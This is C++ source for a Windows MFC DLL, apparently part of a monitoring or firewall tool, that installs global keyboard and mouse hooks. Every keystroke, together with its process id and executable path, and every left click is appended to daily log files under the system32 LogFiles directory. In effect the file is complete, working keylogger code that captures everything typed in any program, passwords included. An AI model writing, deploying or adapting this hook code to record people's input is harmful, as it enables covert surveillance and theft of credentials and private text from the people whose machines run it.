// InputHook.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include "InputHook.h"
#include "ProcessModuleIterator.h"
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <psapi.h>
#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#pragma data_seg(".SHARDAT")
static HHOOK hKey = NULL;
static HHOOK hMouse = NULL;
#pragma data_seg()

HINSTANCE hIns;

#define LOG_KEY 0
#define LOG_MOUSE 1

//
//TODO: If this DLL is dynamically linked against the MFC DLLs,
//		any functions exported from this DLL which call into
//		MFC must have the AFX_MANAGE_STATE macro added at the
//		very beginning of the function.
//
//		For example:
//
//		extern "C" BOOL PASCAL EXPORT ExportedFunction()
//		{
//			AFX_MANAGE_STATE(AfxGetStaticModuleState());
//			// normal function body here
//		}
//
//		It is very important that this macro appear in each
//		function, prior to any calls into MFC.  This means that
//		it must appear as the first statement within the 
//		function, even before any object variable declarations
//		as their constructors may generate calls into the MFC
//		DLL.
//
//		Please see MFC Technical Notes 33 and 58 for additional
//		details.
//


// CInputHookApp

BEGIN_MESSAGE_MAP(CInputHookApp, CWinApp)
END_MESSAGE_MAP()

static void log_input(const char *msg, int type)
{
	static int file_day = 0;	// for midnight checking
	static ULONG event_num = 1;	// number of event in log file

	time_t tv;
	struct tm tm;
	char tm_msg[1024];

	time(&tv);
	localtime_s(&tm, &tv);
	
	char fname[MAX_PATH];
	if (type == LOG_KEY) {
		if (_snprintf(fname, sizeof(fname),
			"%s\\system32\\LogFiles\\tdifw\\%04d%02d%02d.key.log",
			getenv("SystemRoot"),
			tm.tm_year + 1900,
			tm.tm_mon + 1,
			tm.tm_mday) == -1) {
				return;
		}
	} else if (type == LOG_MOUSE) {
		if (_snprintf(fname, sizeof(fname),
			"%s\\system32\\LogFiles\\tdifw\\%04d%02d%02d.mouse.log",
			getenv("SystemRoot"),
			tm.tm_year + 1900,
			tm.tm_mon + 1,
			tm.tm_mday) == -1) {
				return;
		}
	}
	FILE* g_logfile = fopen(fname, "a");
	if (g_logfile == NULL) {
		return;
	}
	if (type == LOG_KEY) {
		if (_snprintf(tm_msg, sizeof(tm_msg),
			"%010u %02d:%02d:%02d\tKey\t%s",
			event_num++, tm.tm_hour, tm.tm_min, tm.tm_sec, msg) == -1)
			tm_msg[sizeof(tm_msg) - 1] = '\0';
	} else if (type == LOG_MOUSE) {
		if (_snprintf(tm_msg, sizeof(tm_msg),
			"%010u %02d:%02d:%02d\tMouse\t%s",
			event_num++, tm.tm_hour, tm.tm_min, tm.tm_sec, msg) == -1)
			tm_msg[sizeof(tm_msg) - 1] = '\0';
	}
		// write it to log file
	fprintf(g_logfile, "%s\n", tm_msg);
	fclose(g_logfile);
}


LRESULT CALLBACK KeyboardProc(int nCode,WPARAM wParam,LPARAM lParam)
{	
	HWND hwnd;
	DWORD pid;
	if(((DWORD)lParam&0xC0000000) && (HC_ACTION == nCode))
	{
		hwnd = GetForegroundWindow();
		GetWindowThreadProcessId(hwnd, &pid);
		CProcessModuleIterator itm(pid);
		HMODULE hModule = itm.First(); // .EXE
		char modname[_MAX_PATH];
		//GetModuleBaseName(itm.GetProcessHandle(), hModule, modname, _MAX_PATH);
		GetModuleFileNameA(hModule, modname, _MAX_PATH);
		char log_msg[_MAX_PATH + 128];
		if (wParam > 32 && wParam < 127) {
			_snprintf(log_msg, sizeof(log_msg), "%u\t%s\t%c", pid, modname,(char)wParam);
			//_snprintf(log_msg, sizeof(log_msg), "%u\t%s\t%c", pid, modname, 'K');
		} else {
			_snprintf(log_msg, sizeof(log_msg), "%u\t%s\t0x%x", pid, modname, (unsigned int)wParam);
			//_snprintf(log_msg, sizeof(log_msg), "%u\t%s\t0x%x", pid, modname, 'K');
		}
		
		log_input(log_msg, LOG_KEY);
		
	} 
	LRESULT RetVal = CallNextHookEx( hKey, nCode, wParam, lParam );	
	return  RetVal;
}

LRESULT CALLBACK MouseProc(int nCode,WPARAM wParam,LPARAM lParam)
{	
	HWND hwnd;
	DWORD pid;
	if(HC_ACTION == nCode)
	{
		hwnd = ((PMOUSEHOOKSTRUCT)lParam)->hwnd;
		GetWindowThreadProcessId(hwnd, &pid);
		CProcessModuleIterator itm(pid);
		HMODULE hModule = itm.First(); // .EXE
		char modname[_MAX_PATH];
		//GetModuleBaseName(itm.GetProcessHandle(), hModule, modname, _MAX_PATH);
		GetModuleFileNameA(hModule, modname, sizeof(modname));
		//HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION,FALSE, pid);
		//GetModuleFileNameEx(hProcess, NULL, modname, sizeof(modname));
		char log_msg[_MAX_PATH + 128];
		switch (wParam) {
			case WM_LBUTTONDOWN:
				_snprintf(log_msg, sizeof(log_msg), "%u\t%s\t%s", pid, modname, "LeftButtonDown");
				log_input(log_msg, LOG_MOUSE);
				break;
		}

	} 
	LRESULT RetVal = CallNextHookEx( hMouse, nCode, wParam, lParam );	
	return  RetVal;
}

BOOL installHook()
{
	hKey = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc,hIns, 0);
	hMouse = SetWindowsHookEx(WH_MOUSE, MouseProc, hIns, 0);
	return TRUE;
}

BOOL uninstallHook()
{
	UnhookWindowsHookEx(hKey);
	UnhookWindowsHookEx(hMouse);
	return TRUE;
}
// CInputHookApp construction

CInputHookApp::CInputHookApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}


// The one and only CInputHookApp object

CInputHookApp theApp;


// CInputHookApp initialization

BOOL CInputHookApp::InitInstance()
{
	CWinApp::InitInstance();
	hIns = AfxGetInstanceHandle();
	return TRUE;
}
